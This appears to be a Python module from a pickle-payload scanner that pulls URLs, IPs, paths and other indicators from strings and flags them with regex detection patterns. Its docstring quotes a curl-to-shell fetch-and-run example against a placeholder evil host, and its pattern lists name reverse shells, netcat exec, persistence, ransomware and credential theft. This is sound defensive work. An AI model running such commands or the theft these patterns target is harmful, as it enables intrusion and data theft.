"""Indicator-of-compromise extraction from the literal strings a payload
carries.

A pickle that runs `os.system("curl http://evil.tld/x | sh")` does not just
reveal a dangerous call - the command string itself is intelligence: the URL,
the host, the shell one-liner. We pull these constants out of the stream so a
report answers "where does it phone home?" and "what does it run?", not only
"is it dangerous?".

Everything here is pure pattern-matching over strings already decoded by the
machine. Nothing is fetched, resolved, or executed.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field

# --- patterns -----------------------------------------------------------

_URL = re.compile(r"\b(?:https?|ftp|tcp|smb|ldap)://[^\s'\"<>|]+", re.I)
_IPV4 = re.compile(
    r"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)"
    r"(?::\d{1,5})?\b"
)
_DOMAIN = re.compile(
    r"\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+"
    r"(?:com|net|org|io|ru|cn|top|xyz|info|biz|tk|gg|onion|me|co|dev|sh|tld)\b",
    re.I,
)
_EMAIL = re.compile(r"\b[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}\b", re.I)
_WIN_PATH = re.compile(r"[A-Za-z]:\\(?:[^\\\n'\"|<>]+\\?)+")
_UNIX_PATH = re.compile(r"(?:/(?:etc|bin|usr|tmp|var|home|root|opt)/[^\s'\"|<>]+)")
_BTC = re.compile(r"\b(?:bc1[a-z0-9]{25,90}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b")

# Shell / living-off-the-land command fragments, weighted as high-signal.
_COMMAND_MARKERS = [
    (re.compile(r"\bpowershell(?:\.exe)?\b", re.I), "powershell invocation"),
    (re.compile(r"-enc(?:odedcommand)?\b", re.I), "encoded PowerShell command"),
    (re.compile(r"\b(?:iex|invoke-expression)\b", re.I), "PowerShell IEX"),
    (re.compile(r"\bcurl\b.*\|\s*(?:sh|bash)", re.I), "curl pipe to shell"),
    (re.compile(r"\bwget\b.*\|\s*(?:sh|bash)", re.I), "wget pipe to shell"),
    (re.compile(r"\bbase64\b\s*(?:-d|--decode)", re.I), "base64 decode in shell"),
    (re.compile(r"/dev/tcp/", re.I), "bash /dev/tcp reverse shell"),
    (re.compile(r"\bnc\b\s+(?:-e|-c)\b", re.I), "netcat with command exec"),
    (re.compile(r"\bchmod\s+\+x\b", re.I), "make file executable"),
    (re.compile(r"\brm\s+-rf\b", re.I), "recursive delete"),
    (re.compile(r"\bcrontab\b", re.I), "cron persistence"),
    (re.compile(r"\breg\s+add\b", re.I), "registry persistence"),
    (re.compile(r"schtasks", re.I), "scheduled-task persistence"),
]

# Ransomware / destructive markers.
_RANSOM_MARKERS = [
    (re.compile(r"\.(?:locked|encrypted|crypt|enc|wcry|wncry)\b", re.I),
     "encrypted-file extension"),
    (re.compile(r"\bransom\b", re.I), "ransom keyword"),
    (re.compile(r"\bdecrypt(?:or|ion)?\b.*\b(?:key|pay|bitcoin|btc)\b", re.I),
     "decryption-for-payment language"),
    (re.compile(r"your files (?:have been|are) (?:encrypted|locked)", re.I),
     "ransom-note language"),
    (re.compile(r"\bAES|Fernet|RSA|cryptography\.fernet\b"),
     "cryptography primitive"),
]

# Credential / data-theft targets (spyware / infostealer).
_STEALER_MARKERS = [
    (re.compile(r"\.ssh/|id_rsa|id_ed25519|known_hosts", re.I), "SSH keys"),
    (re.compile(r"\.aws/credentials|\.aws/config", re.I), "AWS credentials"),
    (re.compile(r"cookies\.sqlite|Login Data|Cookies\b", re.I), "browser secrets"),
    (re.compile(r"AppData\\Roaming|Local\\Google\\Chrome", re.I), "browser profile"),
    (re.compile(r"Keychain|login\.keychain", re.I), "macOS keychain"),
    (re.compile(r"\.env\b|SECRET|API_KEY|PASSWORD|TOKEN", re.I),
     "secret-bearing env/keys"),
    (re.compile(r"wallet\.dat|MetaMask|Exodus\b", re.I), "crypto wallet"),
]


@dataclass
class IOCs:
    urls: list[str] = field(default_factory=list)
    ips: list[str] = field(default_factory=list)
    domains: list[str] = field(default_factory=list)
    emails: list[str] = field(default_factory=list)
    paths: list[str] = field(default_factory=list)
    bitcoin: list[str] = field(default_factory=list)
    commands: list[str] = field(default_factory=list)     # (marker label)
    ransom_signals: list[str] = field(default_factory=list)
    stealer_signals: list[str] = field(default_factory=list)

    def is_empty(self) -> bool:
        return not any(vars(self).values())

    def to_dict(self) -> dict:
        return {k: v for k, v in vars(self).items() if v}


def _uniq(seq):
    seen, out = set(), []
    for x in seq:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


def extract(strings: list[str]) -> IOCs:
    """Extract indicators from the literal strings found in a stream."""
    iocs = IOCs()
    for s in strings:
        if not s or len(s) > 8192:
            continue
        iocs.urls += _URL.findall(s)
        iocs.emails += _EMAIL.findall(s)
        iocs.bitcoin += _BTC.findall(s)
        iocs.ips += _IPV4.findall(s)
        iocs.domains += _DOMAIN.findall(s)
        iocs.paths += _WIN_PATH.findall(s)
        iocs.paths += _UNIX_PATH.findall(s)
        for rx, label in _COMMAND_MARKERS:
            if rx.search(s):
                iocs.commands.append(label)
        for rx, label in _RANSOM_MARKERS:
            if rx.search(s):
                iocs.ransom_signals.append(label)
        for rx, label in _STEALER_MARKERS:
            if rx.search(s):
                iocs.stealer_signals.append(label)

    # An IP inside a URL is already represented; don't double-count bare hosts
    # that are substrings of a captured URL.
    def _dedupe(field_vals, within):
        joined = " ".join(within)
        return _uniq(v for v in field_vals if v not in joined or v in within)

    iocs.urls = _uniq(iocs.urls)
    iocs.emails = _uniq(iocs.emails)
    iocs.bitcoin = _uniq(iocs.bitcoin)
    iocs.ips = _dedupe(iocs.ips, iocs.urls)
    iocs.domains = _uniq(d for d in iocs.domains
                         if d.lower() not in " ".join(iocs.urls).lower()
                         and not d.replace(".", "").isdigit())
    iocs.paths = _uniq(iocs.paths)
    iocs.commands = _uniq(iocs.commands)
    iocs.ransom_signals = _uniq(iocs.ransom_signals)
    iocs.stealer_signals = _uniq(iocs.stealer_signals)
    return iocs
